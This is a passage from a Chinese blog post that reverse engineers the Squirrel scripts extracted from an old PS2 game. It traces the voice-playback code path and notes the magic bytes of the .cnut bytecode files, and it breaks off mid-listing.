savef[info.name];</span><br><span class="line">                break;</span><br><span class="line">            case VAR_SYSTEM:</span><br><span class="line">                var = sf[info.name];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if (store != null) &#123;</span><br><span class="line">                store[info.name] &lt;- var;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                switch(info.type) &#123;</span><br><span class="line">                case 0: // 数値</span><br><span class="line">                    if (var != null) &#123;</span><br><span class="line">                        dm(&quot; セーブパラメータ：&quot; + info.name);</span><br><span class="line">                        setIntFlag(var.tointeger());</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        setIntFlag(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                case 1: // 数値 2</span><br><span class="line">                    if (var != null) &#123;</span><br><span class="line">                        setFloatFlag(var.tofloat());</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        setFloatFlag(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                case 2: // 文字列</span><br><span class="line">                    if (var != null) &#123;</span><br><span class="line">                        setStringFlag(var.tostring(), info.size);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        setStringFlag(&quot;&quot;, info.size);</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function restoreVariables(variables, zone, ...)</span><br><span class="line">&#123;</span><br><span class="line">    local no = 0;</span><br><span class="line">    local store = null;</span><br><span class="line">    if (vargc &gt; 0) &#123;</span><br><span class="line">        no = vargv[0];</span><br><span class="line">        if (vargc &gt; 1) &#123;</span><br><span class="line">            store = vargv[1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    initFlag(zone, no);</span><br><span class="line">    if (zone == VAR_SYSTEMWORK) &#123;</span><br><span class="line">        zone = VAR_SYSTEM;</span><br><span class="line">    &#125;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            local var;</span><br><span class="line">            switch(info.type) &#123;</span><br><span class="line">            case 0: // 数値</span><br><span class="line">                var = getIntFlag();</span><br><span class="line">                break;</span><br><span class="line">            case 1: // 数値 2</span><br><span class="line">                var = getFloatFlag();</span><br><span class="line">                break;</span><br><span class="line">            case 2: // 数値</span><br><span class="line">                var = getStringFlag(info.size);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if (store != null) &#123;</span><br><span class="line">                store[info.name] &lt;- var;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                switch (zone) &#123;</span><br><span class="line">                case 0:</span><br><span class="line">                    savef[info.name] &lt;- var;</span><br><span class="line">                    break;</span><br><span class="line">                case 1:</span><br><span class="line">                    sf[info.name] &lt;- var;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function showVariables(variables, zone)</span><br><span class="line">&#123;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            local var;</span><br><span class="line">            switch (info.zone) &#123;</span><br><span class="line">            case VAR_GAME:</span><br><span class="line">                var = f[info.name];</span><br><span class="line">                break;</span><br><span class="line">            case VAR_SYSTEM:</span><br><span class="line">                var = sf[info.name];</span><br><span class="line">                break;</span><br><span class="line">            case VAR_TEMP:</span><br><span class="line">                var = tf[info.name];</span><br><span class="line">            &#125;</span><br><span class="line">            dm(&quot; 名前:&quot; + info.name + &quot; 値:&quot; + var);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// システムボイス情報</span><br><span class="line">sysvoices &lt;- dofile(&quot;sysvoices.nut&quot;);</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * システムボイスの再生</span><br><span class="line"> */</span><br><span class="line">function systemVoice(name) &#123;</span><br><span class="line">    if (name in sysvoices) &#123;</span><br><span class="line">        Talk(0, sysvoices[name]);</span><br><span class="line">        return TalkLength(0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function systemVoiceStop() &#123;</span><br><span class="line">    TalkStop(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 初期化処理</span><br><span class="line">dofile(&quot;util.nut&quot;, true);</span><br><span class="line">dofile(&quot;Object.nut&quot;, true);</span><br><span class="line">dofile(&quot;BasicLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;msgwindow.nut&quot;, true);</span><br><span class="line">dofile(&quot;translayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;TEXTLAYER.NUT&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;action.nut&quot;, true);</span><br><span class="line">dofile(&quot;player.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;GraphicLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;GamePlayer.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;buttonlayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;dialogwindow.nut&quot;, true);</span><br><span class="line">dofile(&quot;selectwindow.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;EnvObject.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvBase.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvImage.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvLevelLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvBackLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvStageLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvEventLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvSimpleLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvCharacter.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvBGM.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvSE.nut&quot;, true);</span><br><span class="line">dofile(&quot;Environment.nut&quot;, true);</span><br><span class="line">dofile(&quot;ScenePlayer.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;main.nut&quot;, true);</span><br><span class="line">dofile(&quot;game.nut&quot;, true);</span><br><span class="line">dofile(&quot;override.nut&quot;, true); // ゲーム個別の初期化処理を登録する</span><br><span class="line"></span><br><span class="line">function showGlobalInfos() &#123;</span><br><span class="line">    dm(&quot;------- スクリプト側でキャッシュされてる LAYER の画像情報 ------&quot;);</span><br><span class="line">    foreach (name,value in images) &#123;</span><br><span class="line">        dm(&quot;name:&quot; + name + &quot; value:&quot; + value);</span><br><span class="line">    &#125;</span><br><span class="line">    dm(&quot;------- アニメ情報一覧 -----------&quot;);</span><br><span class="line">    foreach (name,value in animeList) &#123;</span><br><span class="line">        dm(&quot;name:&quot; + name + &quot; value:&quot; + value);</span><br><span class="line">    &#125;</span><br><span class="line">    showMemoryInfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一串非常显眼的 <code>dofile</code>，并且参数包含了大量 <code>.nut</code> 结尾的文件，稍微 Google 一下可以发现这是 <code>Squirrel</code> 脚本。<code>Squirrel</code> 是一种面向对象的轻量级脚本语言，类似 Lua，常被用在游戏中。<code>Squirrel</code> 语言程序有两类，一类是 <code>.nut</code> 结尾的明文代码，另一类以 <code>.cnut</code> 结尾，类似 Python 的 <code>pyc</code> 文件，保存字节码，不过在 <code>Squirrel</code> 中这个操作不被称为“编译”，而被称为“序列化”，但是可惜的是 <code>Squirrel</code> 并没有提供反序列化这个操作，换句话说我们还是需要自己想办法将 <code>.cnut</code> 恢复成 <code>.nut</code> 文件。</p><p>基于此，我们将提取出的文件后缀改文 <code>.nut</code>。从 <code>SYSTEM.BIN</code> 中一共提取了 42 个文件，但是其中前 32 个都是明文代码，从第 33 个文件（32_5b000_8688.nut）到最后发现并不是明文，而是包含了大量二进制数据，其中夹杂着部分明文字符串。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/17.jpg" alt="Not Found"></p><p>实际上根据曾经逆向 <code>.pyc</code> 的经验，可以猜出这可能就是 <code>.cnut</code> 字节码文件，里面保存着一些符号。连续打开好几个这类文件，都可以看到很明显的特征：</p><ol><li><code>\xfa\xfaRIQS</code> 开头</li><li>包含了大量的 <code>TRAP</code> 字符串</li><li>开头会出现一个路径 <code>DataMake/xxx/xxx.nut</code></li></ol><p>根据这些特征也可以推断出这就是 <code>.cnut</code> 字节码文件。实际上 <code>.cnut</code> 是用小端存储的，<code>RIQS</code> 也就是 <code>SQIR</code> 是 <code>Squirrel</code> 的缩写，<code>TRAP</code> 也就是 <code>PART</code>，顾名思义是作为分隔符。</p><p>暂时先不管这些字节码，我们的目标是找到角色的语音文本，看了前 32 个脚本，在 <code>14_24000_56d1.nut</code> 中发现有一个 <code>playVoice</code> 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ボイス再生</span><br><span class="line"> * @param name キャラ名</span><br><span class="line"> * @param voicefile 再生ファイル</span><br><span class="line"> */</span><br><span class="line">function playVoice(name, voicefile) &#123;</span><br><span class="line">    if (isSkip() || !voiceenable) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    // ボイス情報取得</span><br><span class="line">    local configName = &quot;etc&quot;;</span><br><span class="line">    if (name in voiceConfigs) &#123;</span><br><span class="line">        configName = voiceConfigs[name];</span><br><span class="line">    &#125;</span><br><span class="line">    if (!getVoiceOn(configName)) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // ボリューム調整</span><br><span class="line">    // volume = getVoiceVolume(configName);</span><br><span class="line">    if (typeof voicefile == &quot;integer&quot;) &#123;</span><br><span class="line">        // ボイス再生処理</span><br><span class="line">        dm(&quot; ボイス再生:&quot; + voicefile);</span><br><span class="line">        Talk(0, voicefile);</span><br><span class="line">        talkVoiceLength = TalkLength(0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dm(&quot; ボイスが再生できない（コンバート時に存在していない）&quot; + voicefile);</span><br><span class="line">    &#125;</span><br><span class="line">    // 時間を返す</span><br><span class="line">    return talkVoiceLength;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中调用 <code>Talk(0, voicefile)</code> 猜测可能是让角色讲话，而 <code>voicefile</code> 是一个 int，应该就是从 <code>VOICE_ID.bin</code> 中提取出的声音文件的 id，<code>0</code> 代表什么暂时未知。可惜的是，在其他几个明文脚本中均未找到 <code>Talk</code> 函数的定义。根据 <code>playVoice</code> 函数注释（的翻译），<code>name</code> 参数表示角色名，<code>voicefile</code> 参数表示要播放的文件，但是最后影响 <code>Tlak</code> 函数的仅有 <code>voicefile</code>，而 <code>name</code> 仅用来判断该角色是否存在于 <code>voiceConfigs</code>。</p><p>首先我们先看一下 <code>playVoice</code> 从哪里会被调用，发现主要是在 <code>28_43000_d330.nut</code> 文件的 <code>playVoices</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 複数ボイスを鳴らす</span><br><span class="line"> * @return 最長のボイス再生時間</span><br><span class="line"> */</span><br><span class="line">function playVoices(voices) &#123;</span><br><span class="line">    local ret = null;</span><br><span class="line">    if (!isJump() &amp;&amp; voices != null) &#123;</span><br><span class="line">        foreach (name, info in voices) &#123;</span><br><span class="line">            local r;</span><br><span class="line">            // デフォルト名の場合の処理</span><br><span class="line">            if (isDefaultName() &amp;&amp; info.voicen != null) &#123;</span><br><span class="line">                r = playVoice(name, info.voicen);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                r = playVoice(name, info.voice);</span><br><span class="line">            &#125;</span><br><span class="line">            if (ret == null || r != null &amp;&amp; r &gt; ret) &#123;</span><br><span class="line">                    ret = r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>playVoice</code> 中的 <code>voicefile</code> 来自 <code>playVoices</code> 中的 <code>voices</code>字典，也就是其参数，保存了多个 <code>(name, voicefile)</code> 键值对。这个函数仅在该文件中的 <code>playNextVoice</code> 被调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ボイス再生実行</span><br><span class="line"> */</span><br><span class="line">function playNextVoice() &#123;</span><br><span class="line">    if (nextvoices != null) &#123;</span><br><span class="line">        local ret = playVoices(nextvoices);</span><br><span class="line">        clearNextVoice();</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 <code>playVoices</code> 中的 <code>voices</code> 字典来自全局变量 <code>nexvoices</code>。接下来再找找 <code>nextvoices</code> 的写值操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 次回再生するボイス情報</span><br><span class="line">// キー: キャラクタ名</span><br><span class="line">// 値: ボイス</span><br><span class="line">nextvoices = null;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 次回同時に鳴らすボイスの追加</span><br><span class="line"> * @param name キャラ名</span><br><span class="line"> * @param voice  ボイス指定</span><br><span class="line"> * @param voicen 非デフォルト時ボイス指定</span><br><span class="line"> */</span><br><span class="line">function entryNextVoice(name, voice, voicen) &#123;</span><br><span class="line">    if (name != null &amp;&amp; voice != null) &#123;</span><br><span class="line">        if (nextvoices == null) &#123;</span><br><span class="line">            nextvoices = &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        nextvoices[name] &lt;- &#123;voice=voice, voicen=voicen&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 次回鳴らすボイスの情報をクリア</span><br><span class="line"> */</span><br><span class="line">function clearNextVoice() &#123;</span><br><span class="line">    nextvoices = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，<code>nextvoices</code> 的作用是保存“下次播放的声音信息”，键为“角色名”，值为“声音”，并且仅在 <code>entryNextVoice</code> 中被写入，同时写入了 <code>voice</code> 也就是“语音指定”以及 <code>voicen</code> 也就是“非默认语音指定”两个信息，那么再找找哪里调用该函数写入接下来要播放的声音信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ボイス追加</span><br><span class="line"> */</span><br><span class="line">function tag_entryvoice(elm) &#123;</span><br><span class="line">    entryNextVoice(elm.name, elm.voice, getval(elm, &quot;voicen&quot;));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 名前表示</span><br><span class="line"> */</span><br><span class="line">function tag_dispname(elm) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    </span><br><span class="line">    //dm(&quot; 名前表示ハンドラ &quot;);</span><br><span class="line">    if (elm == null || !(&quot;name&quot; in elm)  || elm.name == &quot;&quot;) &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        </span><br><span class="line">        local name = getval(elm, &quot;name&quot;);</span><br><span class="line">        local disp = getval(elm, &quot;disp&quot;);</span><br><span class="line">        </span><br><span class="line">        local ch = env.getCharacter(name, null);</span><br><span class="line">        env.currentNameTarget = ch;</span><br><span class="line">        if (&quot;voice&quot; in elm) &#123;</span><br><span class="line">            entryNextVoice(name, elm.voice, getval(elm, &quot;voicen&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">        // 名前の決定</span><br><span class="line">        // ...</span><br><span class="line">        </span><br><span class="line">        // 名前加工処理</span><br><span class="line">        // ...</span><br><span class="line">        </span><br><span class="line">        // 表情判定</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 名前表示</span><br><span class="line">    // ...</span><br><span class="line">    </span><br><span class="line">    // ボイス再生</span><br><span class="line">    if (nextvoices != null) &#123;</span><br><span class="line">        local ret = playNextVoice();</span><br><span class="line">        if (ret &gt; 0) &#123;</span><br><span class="line">            addAutoWait(ret);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样在 <code>28_43000_d330.nut</code> 文件中，有两个 <code>tag</code> 开头的函数：<code>tag_entryvoice</code> 以及 <code>tag_dispname</code>。可以看到 <code>name</code>，<code>voice</code> 以及 <code>voicen</code> 主要来自 <code>elm</code> 参数。</p><p>根据注释以及代码逻辑，<code>tag_entryvoice</code> 的作用是在某个时刻追加要播放的声音，而主要播放逻辑在 <code>tag_dispname</code> 中，首先调用 <code>entryNextVoice</code> 从 <code>elm</code> 中获取所有接下来要播放的声音添加到全局变量 <code>nextvoices</code> 中，之后以此处理名称，名称前缀以及表情等，最后再调用 <code>palyNextVoice</code> 播放这些声音，并且阻塞等待播放完毕。</p><p>这些 <code>tag</code> 开头的函数作为回调函数保存在同文件的 <code>getHandlers</code> 函数中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function getHandlers()</span><br><span class="line">&#123;</span><br><span class="line">    return &#123; // 辞書配列オブジェクト</span><br><span class="line">        // ...</span><br><span class="line">        //----------------------------------------------- ボイス制御</span><br><span class="line">        </span><br><span class="line">        entryvoice    = tag_entryvoice,</span><br><span class="line">        // ...</span><br><span class="line">        dispname      = tag_dispname,</span><br><span class="line">        // ...</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来找找哪里获取并调用了这几个回调函数。同样仅在 <code>28_43000_d330.nut</code> 中 <code>ScenePlayer</code> 类的构造函数 <code>constructor</code> 调用 <code>getHandlers</code> 获取所有回调函数保存在 <code>handlers</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * シーン再生プレイヤー</span><br><span class="line"> * ・シーンの再生機能</span><br><span class="line"> * ・シーンのセーブとロード</span><br><span class="line"> */</span><br><span class="line">class ScenePlayer extends GamePlayer</span><br><span class="line">&#123;</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * コンストラクタ</span><br><span class="line">     */</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        ::GamePlayer.constructor();</span><br><span class="line">        pendings = [];</span><br><span class="line">        branches = [];</span><br><span class="line">        targetBranches = [];</span><br><span class="line">        env = Environment(this, SCWIDTH, SCHEIGHT);</span><br><span class="line">        if (&quot;nameImageMap&quot; in env.envinfo) &#123;</span><br><span class="line">            setNameImageMap(env.envinfo.nameImageMap);</span><br><span class="line">        &#125;</span><br><span class="line">        sceneInfos = dofile(&quot;scenes.nut&quot;);</span><br><span class="line">        handlers = getHandlers();</span><br><span class="line">        historyInit();</span><br><span class="line">        selectOption = &#123;&#125;;</span><br><span class="line">        caches = &#123;&#125;;</span><br><span class="line">        particles = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，这个类是一个“场景再生播放器”，负责“场景的再生功能”以及“场景的保存和载入”，在日语中“再生”就是重放的意思，那么肯定是在这个类中根据场景的变换，播放文本以及对应的音频。实际上 <code>28_43000_d330.nut</code> 文件中的函数以及全局变量（类的静态变量）都属于这个类，包括 <code>playVoices</code>，<code>playNextVoice</code>，<code>nexvoices</code>，<code>entryNextVoice</code>，<code>tag_entryvoice</code>，<code>tag_dispname</code>，<code>getHandlers</code> 以及下面的 <code>onTag</code>。再找找哪里使用了 <code>handlers</code>，发现主要是在同文件同类下的 <code>onTag</code> 中。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * タグの処理</span><br><span class="line"> */</span><br><span class="line">function onTag(elm) &#123;</span><br><span class="line">    local tagname = elm.tagname;</span><br><span class="line">    //dm(&quot; シーンタグ:&quot; + tagname);</span><br><span class="line">    if (tagname in handlers) &#123;</span><br><span class="line">        local handler = handlers[tagname];</span><br><span class="line">        local ret = handler(elm);</span><br><span class="line">        lastTagName = tagname;</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">    // 無効なタグ</span><br><span class="line">    local ret = env.unknown(tagname, elm);</span><br><span class="line">    if (ret == null) &#123;</span><br><span class="line">        local msg = &quot; タグ / マクロ \&quot;&quot; + tagname + &quot;\&quot; は存在しません &quot;;</span><br><span class="line">        errorCmd(msg);</span><br><span class="line">        return 0;</span><br><span class="line">        //throw new Exception(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 <code>onTag</code> 可以发现 <code>elm</code> 中会保存 <code>tagname</code>，也就是对应的回调函数名称，而这个函数则就是调用 <code>elm</code> 指定的回调函数，并且回调参数固定为 <code>elm</code>。接下来再找找哪里调用了 <code>onTag</code>，也许就可以找到哪里给 <code>elm</code> 指定了回调函数，发现同样是在同文件同类下的一个非常大的函数 <code>run</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 